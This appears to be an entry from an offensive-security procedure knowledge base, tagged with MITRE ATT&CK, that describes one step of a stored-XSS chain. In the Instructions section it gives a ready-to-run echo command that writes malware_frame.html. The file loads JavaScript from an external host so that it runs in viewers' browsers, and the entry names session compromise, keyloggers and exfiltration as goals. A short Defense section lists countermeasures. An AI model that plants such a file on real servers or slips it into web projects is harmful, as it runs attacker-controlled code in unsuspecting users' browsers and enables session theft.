---
id: proc-uuid-3
tags:
  - xss
  - malware-file
  - script-injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
  - Node.js
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:02.883Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Create-Malicious-HTML-File

## Summary

This procedure generates an HTML file named malware_frame.html containing a script that loads external malicious JavaScript, which is referenced by the iframe injected via the malicious filename in the previous step.

## Description

The file serves as the payload delivery mechanism for the stored XSS. When the iframe loads it, the embedded <script> tag fetches and executes JS from an attacker-controlled URL, simulating malware like drive-by downloads. This exploits the directory serving without content-type checks. Target is the local served directory. Expected outcome: File loads and executes script in the browser context of viewers.

## Requirements

1. Text editor (e.g., nano, vim) for HTML creation
2. Write access to current directory
3. Knowledge of basic HTML/JS for payload
4. External host for poc.js (e.g., http://bl4de.tech/poc.js)

## Defense

Defensive measures and detection strategies:

- Validate and restrict file uploads/extensions in servers
- Use Content-Security-Policy (CSP) to block external scripts
- Monitor for anomalous file creations with names like 'malware_frame.html' via file integrity monitoring

## Objectives

1. Provide the target for the injected iframe
2. Execute arbitrary JS from external source
3. Compromise browser sessions of directory viewers

## Instructions

### Step 1: Create the HTML File

**Context**: Write HTML with a script tag to load external JS, ensuring it runs in the iframe context.

**Command** (echo or editor):
```bash
echo '<html><body><script src="http://bl4de.tech/poc.js"></script></body></html>' > malware_frame.html
```

> This creates malware_frame.html with the script sourcing poc.js, which could contain alerts, keyloggers, or exfil code. Test locally by opening the file directly to confirm script load (if poc.js is accessible).

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss
- script-injection
